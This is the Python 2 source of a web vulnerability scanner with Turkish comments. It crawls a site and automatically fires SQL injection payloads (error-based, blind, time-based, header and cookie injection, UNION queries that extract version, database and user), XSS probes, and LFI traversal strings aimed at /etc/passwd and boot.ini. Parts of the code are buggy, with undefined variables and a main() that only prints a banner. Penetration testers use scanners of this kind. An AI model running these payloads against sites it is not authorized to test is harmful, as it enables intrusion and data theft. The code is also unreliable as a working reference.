#!/usr/bin/python
# -*- coding: utf-8 -*-
# 0x94 Scanner"
#Multi Thread(POST/GET/BLIND/TIME BASED/HEADER/SQL SCAN) -LFI-XSS SCAN"
#Sunucu IP adresi ve kullanilan http bilgisini alir
#Sunucu Allow header listesini alir
#Sitedeki tum linkleri 2 farkli yontemle alir
#seo ile yada 302 yonlendirmeli linklerin location urllerini otomatik alir
#tum linklerde get ve post sql injection dener
#tum linklerde blind get ve post sql injection dener
#tum linklerde time based sql injection dener
#tum linklerde header injection dener
#sayfada herhangi bir degisme oldugunda degisme satirini ekrana yazar
#tum linklerde xss dener
#tum linklerde lfi dener
#cookie ve proxy destegide vardir.
#butun sonuclari rapor.txt ye kaydeder
#sadece guvenlik testleri icin kullanin
#Turk sitelerinde tarama yapmaz.
#https://github.com/antichown/0x94scanner / https://twitter.com/0x94
import urllib
import urlparse
import sys
import re
import urllib2
from urllib import urlencode
from urlparse import parse_qsl
import httplib
from string import maketrans
import base64
import socket
import Queue
import threading
from time import sleep


#cookie ayarlamak istiyorsan buraya gir
sayfacookie="lalala"
queue = Queue.Queue()

from BeautifulSoup import BeautifulSoup

class HTTPAYAR(urllib2.HTTPRedirectHandler):
    
    def http_error_302(self, req, fp, code, msg, headers):
	print "URL Yonlenmesi Algilandi"
        #yaz("URl Yonlenmesi Algilandi \n"+ str(headers),True)
        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)


    http_error_301 = http_error_303 = http_error_307 = http_error_302
    

#Proxy icin bu satiri aktif etmelisiniz
#opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.ProxyHandler({'http': '127.0.0.1:8888'}))
opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
opener.addheaders = [
        ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
        ("Cookie", sayfacookie)]

urllib2.install_opener(opener)
aynilinkler={}

def yaz(yazi,ekran):
    dosya=open("rapor.txt","a+")
    dosya.write(yazi+"\n")
    dosya.close()
    if ekran==True:
	print yazi
    
    

def formyaz(formurl):  

    toplamveri={}   
    
    html = urllib2.urlopen(formurl).read() 
    soup = BeautifulSoup(html)  
    try:
	forms=soup.findAll("form")        
	for form in forms:  
	    if form.has_key('action'):  
		if form['action'].find('://') == -1: 
			formurl=formurl + "/" + form['action'].strip('/') 
			print formurl
		else:  
		    print "action: " + formurl
	    else:  
		print "action: " + formurl  	
	    if form.has_key('method') and form['method'].lower() == 'post': 
		    yaz("[POST] action " +formurl,False)
		    for post_inputselect in form.findAll("select"):
			    print post_inputselect['name']
			    toplamveri[post_inputselect['name']]="bekir"	
		    
		    for post_input in form.findAll("input"):  
			    if post_input.has_key('type'):  
				if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':  
					if post_input.has_key('id'):  
						print post_input['id']
						if post_input.has_key('value'):
						    toplamveri[post_input['id']]=post_input['value']
						else:
						    toplamveri[post_input['id']]="bekir"
					elif post_input.has_key('name'):
					    print post_input['name']
					    if post_input.has_key('value'):
						toplamveri[post_input['name']]=post_input['value']
					    else:
						toplamveri[post_input['name']]="bekir"
    
						
						
		    
		    postget(formurl, toplamveri,"POST")
		    blindpost(formurl, toplamveri,"POST")
			
	    if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):  
		print "[GET] action " +formurl
		for get_inputselect in form.findAll("select"):
		    if get_inputselect.has_key("name"):
			    print get_inputselect['name']
			    toplamveri[get_inputselect['name']]="bekir"
			    
		
		for get_input in form.findAll("input"):                         
			if get_input.has_key('type'):  
			    if get_input['type'].lower() == 'text' or get_input['type'].lower() == 'password' or get_input['type'].lower() == 'hidden' or get_input['type'].lower() == 'radio':  
				    if get_input.has_key('id'):  
					    print get_input['id']
					    if post_input.has_key('value'):
						toplamveri[post_input['id']]=post_input['value']
					    else:
						toplamveri[post_input['id']]="bekir"					    
					    toplamveri[post_input['id']]="bekir"
				    elif get_input.has_key('name'):
					    print get_input['name']
					    if get_input.has_key('value'):
						toplamveri[get_input['name']]=get_input['value']
					    else:
						toplamveri[get_input['name']]="bekir"
		postget(formurl, toplamveri,"GET")
		blindpost(formurl, toplamveri,"GET")
    except:
	print "Form Degerlerini Alirken Hata olustu"



def cookieinjection(url,cookie):
    try:
	print "Cookie SQL injection deneniyor..."
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
	                     ("X-Forwarded-For", "127.0.0.1'"),
	                     ("Referer", "http://www.site.com'"),
	                     ("Cookie", cookie.replace("=","'="))]
	response = opener.open(url)
	sqlkontrol(response,"[Cookie INJECTION]"+url)
	
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Cookie Injection Http 500 Dondu  / Internal Server Error \n "+cookie.replace("=","'=")+"\n" +url,True)
		
    except urllib2.URLError,  e:
	if "Time" in e.reason:
	    mesaj="Time Out oldu"
	    yaz(mesaj,True)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)           
    

def headerinjection(url):
    try:
	print "Header SQL injection deneniyor..."
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
	                     ("X-Forwarded-For", "127.0.0.1'"),
	                     ("Referer", "http://www.google.com'"),
	                     ("Accept-Language","bekir'")]
	response = opener.open(url)
	headers = response.info()
	yollanacakcookie=headers['Set-Cookie']
	cookieinjection(url, yollanacakcookie)
	sqlkontrol(response,"[Header INJECTION]"+url)
	
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Header Injection Http 500 Dondu  / Internal Server Error " +url,True)
		
    except urllib2.URLError,  e:
	if "Time" in e.reason:
	    mesaj="Time Out oldu"
	    yaz(mesaj,True)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)           

    

							
def timebased(url):
    timesql=[" WAITFOR DELAY '0:0:50';--",
             " IF 1=1 THEN dbms_lock.sleep(50);",
             " 'IF 1=1 THEN dbms_lock.sleep(50);",
             " 'WAITFOR DELAY '0:0:50';--",
             " SLEEP(50)",
             " 'SLEEP(50)",
             " pg_sleep(50)",
             " 'pg_sleep(50)",
             " PG_DELAY(50)",
             " 'PG_DELAY(50)",
             " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " 'and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " DBMS_LOCK.SLEEP(50);",
             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--"]
    
    for timeler in timesql:
	try:
	    print "Time Based SQL Test Yapiliyor ... "
	    urlnormal=url.replace("=", "="+urlencode(parse_qsl(timeler)))
	    urlac = urllib2.urlopen(urlnormal,timeout=40)
	    response = urlac.read()
	    sqlkontrol(response,urlnormal)
		
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Timebased Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +urlnormal,True)
		
	except socket.timeout:
	    yaz("[#] Time BASED SQL Olabilir Cok fazla bekledi",True)
	    
	except urllib2.URLError,  e:
	    if "Time" in e.reason:
		mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(urlnormal,timeler)
		yaz(mesaj,True)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)       


def blindpost(url,params,method):
    
    try:
	
	degisecekdict={} 
	for k,v in params.items():
	    #print k,v
	    degisecekdict[k]=v
	    
	
	parametresaf = urllib.urlencode(params)
	if method=="GET":
	    print "Blind GET SQL testi yapiliyor"
	    y = urllib.urlopen(url+"?"+parametresaf)
	else:
	    print "Blind POST SQL testi yapiliyor"
	    y = urllib2.urlopen(url, parametresaf)
	
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+urlnormal+"\n Yollanan Data ="+parametresaf,True)
	
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
		#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"    

    
    
    
    post_string	=  [" 'aNd 1=1",
                    "bekir' AND 'a'='a",
                    "' select dbms_xmlgen.getxml(‘select “a” from sys.dual’) from sys.dual;",
                    "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
                    " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
		    " 'SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",                    
                    " 'or''='",
                    " bekir 'or''='",
                    " and 1=1",
                    " and 1=1 'a'='a",
                    " 'and 1=1 'a'='a",
		    " 'aNd 1=2",
                    " ' aNd 1=MID((database()),1,1)>1",
		    " ' aNd 2=MID((@@version,1,1)--+",
		    " ' aNd 3=MID((@@version,1,1)--+",
		    " ' aNd 4=MID((@@version,1,1)--+",
		    " ' aNd 5=MID((@@version,1,1)--+",
		    " ' or 1=1 --",
                    " a' or 1=1 --",
                    " ' or 1=1 #",
                    " or 1=1 --",
                    " ') or ('x'='x",
                    " or username LIKE '%a%",
                    " 'or username LIKE '%a%",
                    " 'HAVING 1=1--",
                    " ' and+1=convert(int,@@version)",
                    " ' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
                    " 'a' || 'b' ",
                    " ' SELECT IF(1=1,'true','false')",
                    " ') or ('1'='1--",
                    " 'GROUP BY 99999",
                    " if(true=false,1,SLEEP(5))--+"
                    " and+if(true%21=true,1,SLEEP(5))--+",
                    " and+if(1=2,1,SLEEP(5))--+",
                    " if(1%21=1,1,SLEEP(5))--+",
                    " if(true=true,1,SLEEP(5))--+",
                    " if(2=2,1,SLEEP(5))--+",
                    " and+true=false--+",
                    " and+false%21=false--+",
                    " and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
                    " union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
                    " 'if(true=false,1,SLEEP(5))--+",
                    " 'and+if(true%21=true,1,SLEEP(5))--+",
                    " 'and+if(1=2,1,SLEEP(5))--+",
                    " 'if(1%21=1,1,SLEEP(5))--+",
                    " 'if(true=true,1,SLEEP(5))--+",
                    " 'if(2=2,1,SLEEP(5))--+",
                    " 'and+true=false--+",
                    " 'and+false%21=false--+",
                    " 'and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
                    " 'union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"] 
    
    for postsql in post_string:
	postgetdict={}
	postgetdict=params.copy()
		
	for key,value in params.items():
	    if key in postgetdict:
		postgetdict[key]=value+postsql	    
		try:
		    parametre = urllib.urlencode(postgetdict)
		    if method=="GET":
			print "Blind GET SQL testi yapiliyor" 
			f = urllib.urlopen(url+"?"+parametre)
		    else:
			print "Blind POST SQL testi yapiliyor"
			f = urllib2.urlopen(url, parametre)
		    postgetdict.clear()
		    postgetdict=params.copy()
		    
		except urllib2.HTTPError,  e:
		    if(e.code==500):
			yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data = "+parametre+"\n"+url,True)
		    
		except urllib2.URLError,  e:
		    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
			    #yaz(mesaj)
		except:
		    mesaj="Bilinmeyen hata olustu\n"
			    #yaz(mesaj)   
	    
		comparePages(y.read(),f.read(),f.geturl(),"[#] BLind "+method+" Sayfada Degisiklik oldu %s !!![+]" % f.geturl()+"\nPOST DATASI---------------------------\n"+parametre+"\nYollanan Veri ="+postsql+"\n")	


def postget(url, params, method):
    try:
	
	postgetdict={}
	postgetdict=params.copy()
	
	for key,value in params.items():
	    if key in postgetdict:
		
		postgetdict[key]=value+"'a"
		parametre = urllib.urlencode(postgetdict)
		if method=="GET":
		    print "GET SQL testi yapiliyor"
		    f = urllib.urlopen(url+"?"+parametre)
		else:
		    print "POST SQL testi yapiliyor"
		    f = urllib2.urlopen(url, parametre)
		sqlkontrol (f.read(),url+" [POST Sayfasi]")
		postgetdict.clear()
		postgetdict=params.copy()		
		

	
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("POST "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data ="+parametre+ "\n"+urlnormal,True)
	
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
		#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)       
    


def comparePages(page1,page2,deurl,info):
    tmp1 = re.split("<[^>]+>",page1)
    tmp2 = re.split("<[^>]+>",page2) 
    count1 = 0;
    count2 = 0;
    
    for i in range(len(tmp1)):
	if page2.find(tmp1[i]) < 0:
	    mesaj="Link %s  \n" % (deurl)
	    mesaj+=info
	    mesaj+="[#] Anormal Durum Algilandi / Yakalanan Durum Satiri %s \n" % (tmp1[i])
	    yaz(mesaj+"\n",True)
	    count1+=1
    
    for i in range(len(tmp2)):
	if page1.find(tmp2[i]) < 0:
	    count2+=1
	    #print max(count1, count2)
    return max(count1, count2)


def sqlkontrol(response,urlnormal):
    print "SQL hata mesaji kontrol ediliyor"
    if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
	mesaj= "[#] %s MS-SQL Server error" %urlnormal
	yaz(mesaj,True)
    if re.search("\[Microsoft\]\[ODBC Microsoft Access Driver\] Syntax error",response,re.DOTALL):
	mesaj= "[#] %s MS-Access error"%urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC SQL Server Driver\]",response,re.DOTALL):
	mesaj= "[#] %s MS-SQL Server error"%urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC Access Driver\]",response,re.DOTALL):
	mesaj= "[#] %s MS-Access error"%urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft JET Database Engine",response,re.DOTALL):
	mesaj= "[#] %s MS Jet database engine error"%urlnormal
	yaz(mesaj,True)
    if re.search("ADODB.Command.*error",response,re.DOTALL):
	mesaj= "[#] %s ADODB Error"%urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft VBScript runtime",response,re.DOTALL):
	mesaj= "[#] %s VBScript runtime error"%urlnormal
	yaz(mesaj,True)
    if re.search("Type mismatch",response,re.DOTALL):
	mesaj= "[#] %s VBScript / ASP error"%urlnormal
	yaz(mesaj,True)
    if re.search("Server Error.*System\.Data\.OleDb\.OleDbException",response,re.DOTALL):
	mesaj= "[#] %s ASP .NET OLEDB Exception"%urlnormal
	yaz(mesaj,True)
    if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
	mesaj= "[#] %s Apache Tomcat JDBC error"%urlnormal
	yaz(mesaj,True)
    if re.search("Warning: mysql_fetch_array",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error"%urlnormal
	yaz(mesaj,True)	
    if re.search("Warning.*supplied argument is not a valid MySQL result",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error"%urlnormal
	yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*on line",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error"%urlnormal
	yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*at line",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error"%urlnormal
	yaz(mesaj,True)
    if re.search("Warning.*mysql_.*\(\)",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error"%urlnormal
	yaz(mesaj,True)
    if re.search("ORA-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
	mesaj= "[#] %s Oracle DB Server error"%urlnormal
	yaz(mesaj,True)
    if re.search("DorisDuke error",response,re.DOTALL):
	mesaj= "[#] %s DorisDuke error\n"%urlnormal
	yaz(mesaj,True)
    if re.search("javax\.servlet\.ServletException",response,re.DOTALL):
	mesaj= "[#] %s Java Servlet error"%urlnormal
	yaz(mesaj,True)
    if re.search("org\.apache\.jasper\.JasperException",response,re.DOTALL):
	mesaj= "[#] %s Apache Tomcat error"%urlnormal
	yaz(mesaj,True)
    if re.search("Warning.*failed to open stream",response,re.DOTALL):
	mesaj= "[#] %s PHP error"%urlnormal
	yaz(mesaj,True)
    if re.search("Fatal Error.*on line",response,re.DOTALL):
	mesaj= "[#] %s PHP error"%urlnormal
	yaz(mesaj,True)
    if re.search("Fatal Error.*at line",response,re.DOTALL):
	mesaj= "[#] %s PHP error"%urlnormal
	yaz(mesaj,True)


def xsstest(xsstesturl):

    try:
	print "XSS Test ediliyor ... "
	urlac = urllib2.urlopen(xsstesturl+"bekirburadaydi11111")
	response = urlac.read()
	if "bekirburadaydi11111" in response:
	    yaz("XSS Test BULUNDU : " + xsstesturl+"bekirburadaydi11111",True)
	    xsstara(xsstesturl)
		  
    except urllib2.HTTPError,e:
	if(e.code==500):
	    yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +xsstesturl,True)
   
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,xsstesturl)
	   #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"           
	

def xsstara(xssurl):
    try:
	print "XSS Taraniyor ... "
	urlnormal=lfiurl.replace("=", "=bekirburadaydi11111")
	urlac = urllib2.urlopen(urlnormal)
	response = urlac.read()
	if "bekirburadaydi11111" in response:
	    yaz("[#] XSS BULUNDU : " + urlnormal,True)
		   
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +urlnormal,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"    

def lfitara(lfibul):
    
    lfiyollar=['/etc/passwd', 
	'../etc/passwd',
	'../../etc/passwd',
	'../../../etc/passwd',
	'../../../../etc/passwd',
	'../../../../../etc/passwd',
	'../../../../../../etc/passwd',
	'../../../../../../../etc/passwd',
	'../../../../../../../../etc/passwd',
	'../../../../../../../../../etc/passwd',
	'../../../../../../../../../../etc/passwd',
	'../../../../../../../../../../../etc/passwd',
	'../etc/passwd%00',
	'../../etc/passwd%00',
	'../../../etc/passwd%00',
	'../../../../etc/passwd%00',
	'../../../../../etc/passwd%00',
	'../../../../../../etc/passwd%00',
	'../../../../../../../etc/passwd%00',
	'../../../../../../../../etc/passwd%00',
	'../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../../etc/passwd%00',
	'boot.ini%00',
        '.../boot.ini%00',
	'../../boot.ini%00',
	'../../../boot.ini%00',
	'../../../../boot.ini%00',
	'../../../../../boot.ini%00',
	'../../../../../../boot.ini%00',
	'../../../../../../../boot.ini%00',
	'../../../../../../../../boot.ini%00',
	'../../../../../../../../../boot.ini%00',
	'../../../../../../../../../../boot.ini%00',
	'../../../../../../../../../../../boot.ini%00',
        'boot.ini',
        '.../boot.ini',
        '../../boot.ini',
        '../../../boot.ini',
        '../../../../boot.ini',
        '../../../../../boot.ini',
        '../../../../../../boot.ini',
        '../../../../../../../boot.ini',
        '../../../../../../../../boot.ini',
        '../../../../../../../../../boot.ini',
        '../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../boot.ini']
	
    try:
	for lfidizin in lfiyollar:
	    print "LFi Taraniyor ... "
	    urlnormal=lfiurl.replace("=", "="+lfidizin)
	    urlac = urllib2.urlopen(urlnormal)
	    response = urlac.read()
	    if "root:" in response or "noexecute=optout" in response:
		yaz("[#] LFI BULUNDU : " + urlnormal,True)
	       
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +urlnormal,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)       
    

def lfitest(lfiurl):
    
    try:
	print "LFI Test Yapiliyor ... "
	urlnormal=lfiurl.replace("=", "=bekirburadaydi.txt")
	urlac = urllib2.urlopen(urlnormal)
	response = urlac.read()
	if "failed to open stream" in response:
	    yaz("[#] LFI Testi BULUNDU : " + urlnormal,True)
	    lfitara(lfiurl)
	       
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +urlnormal,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)       

    
   
    

def sql(urlnormal):
    try:
	print "SQL Test Taraniyor ... "
	urlnormal=urlnormal.replace("=", "='")
	urlac = urllib2.urlopen(urlnormal)
	response = urlac.read()
	sqlkontrol(response,urlnormal)
	
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +urlnormal,True)

    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	#yaz(mesaj)   
	

def blind(urlblind):
    

    linknormal = urllib2.urlopen(urlblind)
    normalkaynak=linknormal.read()

    print "Blind Taraniyor ... "
    true_strings = [" and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1--"," group by 1"]           
    false_strings =[" and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2--"," group by 99999"]
    i = 0
    while i < 7:    
        blindtrue = urlblind + urlencode(parse_qsl(true_strings[i])) 
	print "Denenen Blind : "+true_strings[i]
        try:
            req1 = urllib2.Request(blindtrue.replace("&",urlencode(parse_qsl(true_strings[i])) +"&").replace(" ", "%20"))
            req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
            req1.add_header('Keep-Alive: ','115')
            req1.add_header('Referer: ','http://'+urlblind)
            response1 = urllib2.urlopen(req1)
            html1 = response1.read()
	    
        except urllib2.HTTPError,e:
            if(e.code==500):
		yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error " +urlblind+true_strings[i],True)
	except urllib2.URLError,e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
	    #yaz(mesaj)
	
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)
	    
        blindfalse = urlblind + urlencode(parse_qsl(false_strings[i])) 
	print "Denenen Blind:"+false_strings[i]
	try:
	    i=i+1
            req2 = urllib2.Request(blindfalse.replace("&",urlencode(parse_qsl(false_strings[i])) +"&").replace(" ", "%20"))
            req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
            req2.add_header('Keep-Alive: ','115')
            req2.add_header('Referer: ','http://'+urlblind)
            response2 = urllib2.urlopen(req2)
            html2 = response2.read() 
		
	except urllib2.HTTPError,e:
            if(e.code==500):
		yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error" +urlblind+false_strings[i],True)
	except urllib2.URLError,e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
	    #yaz(mesaj)
	
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)
   
	
              
	if (comparePages(html1,normalkaynak,response2.geturl()," BLIND ") > comparePages(html1,html2,linknormal.geturl()," BLIND ")):
		    mesaj="[#] Blind ile Sayfada Degisiklik oldu %s " % urlblind+"\nVERi = "+false_strings[i]+"\n"
		    yaz(mesaj,True)
 


    
class YeniOpener(urllib.FancyURLopener):   
    version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'

def aynivarmi(keyurl):
    if aynilinkler.has_key(keyurl):
	return True
    else:
	return False



def optionsheader(url):
    try:
	print "Allow Header Bilgisi Aliniyor"
	o = urlparse.urlparse(url)
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ipsi=socket.gethostbyname(o.hostname)
	yaz("IP Adresi : "+ipsi,True)
	sock.connect((ipsi,80))
	req = "OPTIONS / HTTP/1.1\r\n"
	req += "Host: " + o.hostname + "\r\n"
	req += "Connection: close\r\n"
	req += "\r\n\r\n"
	sock.send(req)
	data = sock.recv(1024)
	yaz(data,True)
	sock.close()
	r1 = re.compile('DAV')
	result = r1.findall(data)
	if result == []:
		yok=0
	else:
		  
		print "[+] Sunucuda WebDav kurulu"
    except:
	print "Allow Header alinirken hata oldu"

def headerbilgi(host):
    try:
	urlac = urllib2.urlopen(host)
	robots(host)
	yaz("[#] Makina Bilgisi : "+host+" - "+str(urlac.info().getheader('Server')),True)
    except:
	print "Header bilgisi alinamadi"

def robots(host):
    try:
	urlac = urllib2.urlopen(host+"/robots.txt").read()
	if "Disallow:" in urlac or "Allow:"  in urlac:
	    yaz("[#] robots.txt dosyasi bulundu "+host+"/robots.txt",True)
    except:
	print "robots.txt kontrolu yapilamadi"

def locationbypass(link):
    try:
	o = urlparse.urlparse(link,allow_fragments=True)
	conn = httplib.HTTPConnection(o.netloc)
	path = o.path
	if o.query:
		path +='?'+o.query   
	conn.request("HEAD", path)
	res = conn.getresponse()
	headers = dict(res.getheaders())
	if headers.has_key('location'):
	    if "http" not in headers['location']:
		print "Eski URL "+link
		print "Yeni URL "+o.hostname+headers['location']
		return "http://"+o.hostname+headers['location'].encode('utf-8').strip()
	    else:
		return headers['location'].encode('utf-8').strip()
	else:
	    return link.encode('utf-8').strip() 
    except:
	print "Location Alinirken Hata oldu"


class Anaislem(threading.Thread):
    def __init__(self, queues,lock):
        threading.Thread.__init__(self)
	self.queue = queue
	self.lock  = lock
	self.tamurl=""

    def run(self):
	while not self.queue.empty():
	    try:
		self.tamurl = self.queue.get()
		formyaz(self.tamurl)
		headerinjection(self.tamurl)
		if "javascript" not in self.tamurl:
		    if "php?" in self.tamurl:
			lfitest(self.tamurl)
			
		    if "?" in self.tamurl:
			sql(self.tamurl)
			timebased(self.tamurl)
			blind(self.tamurl)
			xsstest(self.tamurl)  
	    except:
		print "site adresi alinirken hata oldu"
		self.queue.task_done()
		continue
		


def linkler(urltara):
    try:
	dahildegil = ("ico","css","mailto:","tel:","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
	
	linkopener = YeniOpener()
	linkopener.addheaders = [
	    ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
	    ("Cookie", sayfacookie)]
	
	page = linkopener.open(urltara)
	host=urlparse.urlparse(urltara).hostname
	text = page.read()
	page.close()
	soup = BeautifulSoup(text)
	
	for ee in re.findall('''href=["'](.[^"']+)["']''', text, re.I):
	    if "tel:+" not in ee or "mailto:" not in ee:
		if ee.split('.')[-1].lower() not in dahildegil:	    
		    birlesik=urlparse.urljoin(urltara, ee).replace("#","")
		    if aynivarmi(birlesik)==False:
			queue.put(birlesik)
			aynilinkler[birlesik]="bekir"
	    
	
	for tag in soup.findAll('a',href=True):
	    tag['href'] = urlparse.urljoin(urltara, tag['href'])
	    asilurl=tag['href'].encode('utf-8').strip()
	    tamurl=asilurl
	    tamurl=locationbypass(asilurl)
	    if aynivarmi(tamurl)==False:
		if host in tamurl:
		    queue.put(tamurl)
		    aynilinkler[tamurl]="bekir"
		    
	threads = []
	lock    = threading.Lock()
	for i in range(5):
	    t = Anaislem(queue,lock)
	    t.setDaemon(True)
	    threads.append(t)
	    t.start()
	   
	while any([x.isAlive() for x in threads]):
	    sleep(0.1)

	

    except:
	print "Linkleri alirken hata olustu"

def main():
    print "########################################"
    print "#                                      #"
    print "#           0x94 Scanner               #"  
    print "#        by 0x94 a.k.a The_BeKiR       #" 
    print "#        https://twitter.com/0x94      #"
    print "#                                      #"
    print "########################################"
    print ""
